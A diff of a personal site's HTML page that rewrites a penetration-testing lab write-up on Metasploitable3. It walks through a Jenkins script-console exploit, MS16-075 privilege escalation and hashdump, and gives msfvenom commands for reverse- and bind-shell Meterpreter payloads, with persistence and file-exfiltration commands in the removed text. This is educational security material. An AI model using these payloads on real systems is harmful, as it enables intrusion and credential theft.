@@ -2,239 +2,245 @@
 <html lang="en">
 
 <head>
-    <!-- Required meta tags -->
-    <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    
-    <!-- SEO Meta Tags -->
-    <meta name="description" content="Exploitation and Post Exploitation with Metasploitable - Learn penetration testing techniques using Kali Linux and Metasploitable3 virtual machines">
-    <meta name="keywords" content="Metasploitable, Exploitation, Post Exploitation, Penetration Testing, Kali Linux, Ethical Hacking, Cybersecurity">
-    <meta name="author" content="Massimiliano Gargano">
-    
-    <!-- Security Headers -->
-    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://cdn.jsdelivr.net; font-src 'self' https://fonts.gstatic.com; script-src 'self' https://cdn.jsdelivr.net; img-src 'self' data:; connect-src 'self';">
 
-    <!-- Favicon -->
-    <link rel="icon" type="image/x-icon" href="static/img/favicon.ico">
+	<!-- Required meta tags -->
+	<meta charset="UTF-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-    <!-- Bootstrap 5 -->
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet"
-        integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
+	<!-- Security Headers -->
+	<meta http-equiv="Content-Security-Policy"
+		content="default-src 'self'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://cdn.jsdelivr.net; font-src 'self' https://fonts.gstatic.com; script-src 'self' https://cdn.jsdelivr.net https://gist.github.com; img-src 'self' data:; connect-src 'self';">
 
-    <!-- Custom CSS -->
-    <link rel="stylesheet" href="static/css/base.css">
-    <link rel="stylesheet" href="static/css/components.css">
-    <link rel="stylesheet" href="static/css/layout.css">
-    <link rel="stylesheet" href="static/css/pages/articles.css">
+	<!-- Favicon -->
+	<link rel="icon" type="image/x-icon" href="static/img/favicon.ico">
 
-    <!-- Fonts -->
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link
-        href="https://fonts.googleapis.com/css2?family=Nunito:ital,wght@0,200;0,300;0,400;0,700;1,200;1,300;1,400;1,700&display=swap"
-        rel="stylesheet">
+	<!-- Bootstrap 5 -->
+	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet"
+		integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
 
-    <title>Massimiliano Gargano - Exploitation and Post Exploitation with Metasploitable</title>
+	<!-- Custom CSS -->
+	<link rel="stylesheet" href="static/css/base.css">
+	<link rel="stylesheet" href="static/css/components.css">
+	<link rel="stylesheet" href="static/css/layout.css">
+	<link rel="stylesheet" href="static/css/pages/articles.css">
+
+	<!-- Fonts -->
+	<link rel="preconnect" href="https://fonts.googleapis.com">
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	<link
+		href="https://fonts.googleapis.com/css2?family=Nunito:ital,wght@0,200;0,300;0,400;0,700;1,200;1,300;1,400;1,700&display=swap"
+		rel="stylesheet">
+
+	<title>Massimiliano Gargano - Ethical Hacking with Metasploit</title>
+
 </head>
 
 <body>
-    <div class="arrow">
-        <a href="index.html">←</a>
-    </div>
 
-    <div class="container">
-        <h1>Exploitation and Post Exploitation with Metasploitable</h1>
-        
-        <p>
-            This article demonstrates penetration testing techniques using Metasploitable3, a deliberately vulnerable Windows virtual machine designed for security training. We'll explore exploitation and post-exploitation phases using Kali Linux as our attacking platform.
-        </p>
+	<div class="arrow"> <a href="index.html">
+			← </a>
+	</div>
+	<div class="container">
+		<h1>Exploitation and Post-exploitation with Metasploit</h1>
+		<h2>Exploiting a Windows Metasploitable3 Machine</h2>
 
-        <h2>Virtual Machine Setup</h2>
-        
-        <p>
-            We configured our virtual machines with the following network parameters:
-        </p>
-        
-        <ul>
-            <li><strong>Network Configuration:</strong> NAT Network 192.168.100.0/24</li>
-            <li><strong>Kali Linux IP:</strong> 192.168.100.4</li>
-            <li><strong>Metasploitable3 Windows IP:</strong> 192.168.100.5</li>
-        </ul>
+		<img src="static/img/ethical/meta.jpeg" alt="Metasploitable">
 
-        <h2>Network Reconnaissance</h2>
-        
-        <p>
-            The first step in any penetration test is reconnaissance. We begin by discovering live hosts and identifying open services on the target machine.
-        </p>
 
-        <h3>Host Discovery</h3>
-        
-        <p>
-            Using Nmap to discover active hosts in our network segment:
-        </p>
-        
-        <pre><code>nmap -sn 192.168.100.0/24</code></pre>
-        
-        <p>
-            This ping scan helps us identify which IP addresses are responding and available for further enumeration.
-        </p>
+		<h3>Network Setup and Configuration</h3>
+		<p>
+			To begin this penetration testing exercise, I configured two virtual machines within a NAT network
+			(192.168.100.0/24). The Kali Linux machine was assigned IP 192.168.100.4, while the target Windows
+			Metasploitable3 machine received IP 192.168.100.5.
+		</p>
 
-        <h3>Port Scanning</h3>
-        
-        <p>
-            Once we've identified our target (192.168.100.5), we perform a comprehensive port scan to identify running services:
-        </p>
-        
-        <pre><code>nmap -sS -sV -O -A 192.168.100.5</code></pre>
-        
-        <p>
-            This scan reveals open ports, service versions, and operating system information that will guide our exploitation strategy.
-        </p>
+		<img src="static/img/ethical/image001.png" alt="Network configuration showing both machine IPs">
+		<p class="image-caption">Figure 1 - IPs of the machines</p>
 
-        <h2>Vulnerability Assessment</h2>
-        
-        <p>
-            After identifying open services, we analyze them for known vulnerabilities. Metasploitable3 intentionally contains numerous security flaws including:
-        </p>
-        
-        <ul>
-            <li>Outdated services with known CVEs</li>
-            <li>Weak authentication mechanisms</li>
-            <li>Misconfigured applications</li>
-            <li>Unpatched system vulnerabilities</li>
-        </ul>
+		<h3>Network Scanning and Reconnaissance</h3>
+		<p>
+			The first step in any penetration test is reconnaissance. I performed a comprehensive port scan
+			using Nmap to identify open services on the target machine:
+		</p>
+		<pre><code>nmap -sV -p- 192.168.100.5</code></pre>
 
-        <h2>Exploitation Phase</h2>
-        
-        <p>
-            Using the Metasploit Framework, we can exploit identified vulnerabilities to gain initial access to the target system.
-        </p>
+		<img src="static/img/ethical/image003.png" alt="Nmap fingerprinting results">
+		<p class="image-caption">Figure 2 - Nmap fingerprinting results</p>
 
-        <h3>Metasploit Framework</h3>
-        
-        <p>
-            Launch Metasploit and search for relevant exploits:
-        </p>
-        
-        <pre><code>msfconsole
-search metasploitable3
-search type:exploit platform:windows</code></pre>
+		<h3>Service Analysis - Jenkins Discovery</h3>
+		<p>
+			Among the discovered services, port 8484 caught my attention. Further analysis confirmed that
+			Jenkins was running behind this port, presenting a potential attack vector.
+		</p>
 
-        <h3>Exploit Selection and Configuration</h3>
-        
-        <p>
-            Select an appropriate exploit module and configure the required parameters:
-        </p>
-        
-        <pre><code>use exploit/windows/[specific_exploit]
-set RHOSTS 192.168.100.5
-set LHOST 192.168.100.4
-set payload windows/meterpreter/reverse_tcp</code></pre>
+		<img src="static/img/ethical/image004.png" alt="Jenkins service confirmation">
+		<p class="image-caption">Figure 3 - Confirming Jenkins is behind this port</p>
 
-        <h2>Post-Exploitation Activities</h2>
-        
-        <p>
-            Once we've successfully exploited the target and established a Meterpreter session, we can perform various post-exploitation activities to demonstrate the impact of the compromise.
-        </p>
+		<h3>Authentication Analysis</h3>
+		<p>
+			I needed to determine if the Jenkins instance required authentication. Using curl, I probed
+			the service to understand its security configuration:
+		</p>
+		<pre><code>curl -I http://192.168.100.5:8484/</code></pre>
 
-        <h3>System Information Gathering</h3>
-        
-        <p>
-            Collect detailed information about the compromised system:
-        </p>
-        
-        <pre><code>sysinfo
-getuid
-ps
-netstat</code></pre>
+		<img src="static/img/ethical/image005.png" alt="Curl response from port 8484">
+		<p class="image-caption">Figure 4 - Response from curl on port 8484</p>
 
-        <h3>Privilege Escalation</h3>
-        
-        <p>
-            Attempt to escalate privileges to gain administrative access:
-        </p>
-        
-        <pre><code>getsystem
-getprivs</code></pre>
+		<h3>Exploit Research and Selection</h3>
+		<p>
+			The reconnaissance revealed that no authentication was required for the Jenkins console.
+			I searched for relevant exploits in Metasploit that could leverage this vulnerability
+			to establish a meterpreter shell.
+		</p>
 
-        <h3>Persistence Mechanisms</h3>
-        
-        <p>
-            Establish persistence to maintain access across system reboots:
-        </p>
-        
-        <pre><code>run persistence -S -U -X -i 5 -p 4444 -r 192.168.100.4</code></pre>
+		<img src="static/img/ethical/image006.png" alt="Exploit search in Metasploit">
+		<p class="image-caption">Figure 5 - Exploit search in Metasploit</p>
 
-        <h3>Data Extraction</h3>
-        
-        <p>
-            Search for and extract sensitive information:
-        </p>
-        
-        <pre><code>search -f *.txt
-search -f *.pdf
-search -f *.doc*
-download [filename]</code></pre>
+		<h3>Exploit Configuration</h3>
+		<p>
+			I selected the <code>jenkins_script_console</code> exploit, which targets Jenkins script
+			consoles that are accessible without proper authentication. This exploit allows for the
+			establishment of a meterpreter session by executing arbitrary code through the Jenkins
+			script console. The configuration required setting RHOSTS, RPORT, and TARGETURI parameters.
+		</p>
 
-        <h2>Network Lateral Movement</h2>
-        
-        <p>
-            From the compromised system, we can attempt to discover and attack other systems in the network:
-        </p>
-        
-        <pre><code>run post/windows/gather/arp_scanner RHOSTS=192.168.100.0/24
-route add 192.168.100.0 255.255.255.0 [session_id]
-use auxiliary/scanner/portscan/tcp</code></pre>
+		<img src="static/img/ethical/image007.png" alt="Exploit configuration">
+		<p class="image-caption">Figure 6 - Exploit configuration</p>
 
-        <h2>Evidence Collection</h2>
-        
-        <p>
-            Document all findings with screenshots and command outputs to create a comprehensive penetration testing report. This includes:
-        </p>
-        
-        <ul>
-            <li>Network topology and discovered hosts</li>
-            <li>Identified vulnerabilities and their severity</li>
-            <li>Successful exploitation attempts</li>
-            <li>Post-exploitation activities performed</li>
-            <li>Data accessed or exfiltrated</li>
-            <li>Recommended remediation steps</li>
-        </ul>
+		<h3>Initial Shell Access</h3>
+		<p>
+			The exploit executed successfully, granting me a meterpreter shell on the target system.
+			This initial access provided a foothold for further enumeration and privilege escalation.
+		</p>
 
-        <h2>Defensive Countermeasures</h2>
-        
-        <p>
-            Understanding these attack techniques helps in implementing proper defensive measures:
-        </p>
-        
-        <ul>
-            <li><strong>Regular Security Updates:</strong> Keep all systems and applications patched</li>
-            <li><strong>Network Segmentation:</strong> Limit lateral movement capabilities</li>
-            <li><strong>Access Controls:</strong> Implement principle of least privilege</li>
-            <li><strong>Monitoring:</strong> Deploy comprehensive logging and intrusion detection</li>
-            <li><strong>Employee Training:</strong> Educate users about social engineering attacks</li>
-        </ul>
+		<img src="static/img/ethical/image008.png" alt="Meterpreter shell obtained">
+		<p class="image-caption">Figure 7 - Meterpreter shell established</p>
 
-        <h2>Conclusion</h2>
-        
-        <p>
-            This exercise demonstrates the complete attack lifecycle from reconnaissance to post-exploitation. Metasploitable3 provides an excellent platform for learning penetration testing techniques in a controlled environment. Understanding these attack vectors is crucial for cybersecurity professionals to better defend their organizations against real-world threats.
-        </p>
-        
-        <p>
-            Remember that these techniques should only be used in authorized testing environments or with explicit permission. Unauthorized use of these methods against systems you don't own is illegal and unethical.
-        </p>
-    </div>
+		<h3>System Enumeration</h3>
+		<p>
+			After establishing the initial shell, I gathered information about the current user privileges
+			and system details using the <code>getuid</code> and <code>sysinfo</code> commands.
+		</p>
 
-    <!-- JS -->
-    <script src="static/js/footer.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.10.2/dist/umd/popper.min.js"
-        integrity="sha384-7+zCNj/IqJ95wo16oMtfsKbZ9ccEh31eOz1HGyDuCQ6wgnyJNSYdrPa03rtR1zdB"
-        crossorigin="anonymous"></script>
-    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.min.js"
-        integrity="sha384-QJHtvGhmr9XOIpI6YVutG+2QOK9T+ZnN4kzFN1RtK3zEFEIsxhlmWl5/YESvpZ13"
-        crossorigin="anonymous"></script>
+		<img src="static/img/ethical/image009.png" alt="Privilege and system information">
+		<p class="image-caption">Figure 8 - Information about privileges and system</p>
+
+		<h3>Privilege Escalation Strategy</h3>
+		<p>
+			The initial enumeration revealed that I did not have administrative privileges. To achieve
+			full system compromise, privilege escalation was necessary. I backgrounded the meterpreter
+			session and returned to the Metasploit framework to search for local Windows exploits:
+		</p>
+		<pre><code>search type:exploit platform:windows local</code></pre>
+
+		<img src="static/img/ethical/image010.png" alt="MS16-075 reflection juicy exploit">
+		<p class="image-caption">Figure 9 - MS16-075 reflection juicy exploit</p>
+
+		<h3>Privilege Escalation Execution</h3>
+		<p>
+			I selected the <code>ms16_075_reflection_juicy</code> exploit, which combines the MS16-075
+			vulnerability with "Juicy Potato" techniques. This exploit targets a vulnerability in the
+			Windows Secondary Logon service, allowing escalation from a local user to SYSTEM privileges.
+		</p>
+
+		<img src="static/img/ethical/image011.png" alt="Privilege escalation with ms16_075_reflection_juicy">
+		<p class="image-caption">Figure 10 - Privilege escalation with ms16_075_reflection_juicy</p>
+
+		<h3>Privilege Verification</h3>
+		<p>
+			After running the privilege escalation exploit, I verified the new privilege level using
+			the <code>getsystem</code> command to confirm successful elevation to SYSTEM privileges.
+		</p>
+
+		<img src="static/img/ethical/image012.png" alt="Privilege verification">
+		<p class="image-caption">Figure 11 - Privilege verification</p>
+
+		<h3>Post-Exploitation: Credential Extraction</h3>
+		<p>
+			With SYSTEM privileges successfully obtained, I demonstrated the impact by extracting
+			password hashes from the system using the <code>hashdump</code> command.
+		</p>
+
+		<img src="static/img/ethical/image013.png" alt="Hashdump example">
+		<p class="image-caption">Figure 12 - Hashdump example</p>
+
+		<h2>Understanding Payload Types: Bind vs Reverse</h2>
+
+		<p>
+			A fundamental concept in penetration testing is understanding the difference between bind
+			and reverse payloads. The main distinction lies in the direction of the connection
+			established when the payload executes.
+		</p>
+
+		<img src="static/img/ethical/image014.png" alt="Illustration of Bind and Reverse payloads">
+		<p class="image-caption">Figure 13 - Illustration of Bind and Reverse payloads (S3Curiosity, 2023)</p>
+
+		<h3>Bind Payloads</h3>
+		<p>
+			A bind payload creates a server (listener) on the target machine that waits for the attacker
+			to connect. In this scenario, the victim "listens" on a specific port, waiting for an
+			incoming connection from the attacker.
+		</p>
+
+		<h4>Example of Bind Payload Generation:</h4>
+		<pre><code>msfvenom -p windows/meterpreter/bind_tcp LPORT=4444 -f exe > bind_payload.exe</code></pre>
+
+		<p><strong>Process:</strong></p>
+		<ol>
+			<li>The payload opens port 4444 on the victim machine and waits for connections</li>
+			<li>The attacker connects to that port from their machine</li>
+			<li>The attacker gains access through meterpreter</li>
+		</ol>
+
+		<h4>Connecting to a Bind Payload:</h4>
+		<pre><code>use exploit/multi/handler
+set payload windows/meterpreter/bind_tcp
+set LHOST 192.168.1.5
+set LPORT 4444
+exploit</code></pre>
+
+		<h3>Reverse Payloads</h3>
+		<p>
+			A reverse payload makes the target machine initiate the connection to the attacker.
+			The victim connects to the attacker, who is in listening mode. This is the more common
+			type as it usually evades firewalls more easily, since many firewalls allow outgoing
+			connections but block incoming ones.
+		</p>
+
+		<h4>Example of Reverse Payload Generation:</h4>
+		<pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe > reverse_payload.exe</code></pre>
+
+		<p><strong>Process:</strong></p>
+		<ol>
+			<li>The victim machine initiates a connection to the attacker's IP (192.168.1.5) on port 4444</li>
+			<li>The attacker must have a listener configured previously</li>
+			<li>The attacker receives the connection and gains access with meterpreter</li>
+		</ol>
+
+		<h4>Setting up the Listener for Reverse Payload:</h4>
+		<pre><code>use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 192.168.1.5
+set LPORT 4444
+exploit</code></pre>
+
+		<h2>References</h2>
+		<p>
+			S3Curiosity. (2023). <em>Understanding Shell, Reverse Shell, and Bind Shell: A Comprehensive Guide</em>.
+			Retrieved from Medium: <a
+				href="https://medium.com/@S3Curiosity/understanding-shell-reverse-shell-and-bind-shell-a-comprehensive-guide-6bad2169edbd"
+				target="_blank">
+				https://medium.com/@S3Curiosity/understanding-shell-reverse-shell-and-bind-shell-a-comprehensive-guide-6bad2169edbd</a>
+		</p>
+
+	</div>
+
+	<!-- Bootstrap 5 JS -->
+	<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"
+		integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p"
+		crossorigin="anonymous"></script>
+
 </body>
 
 </html>
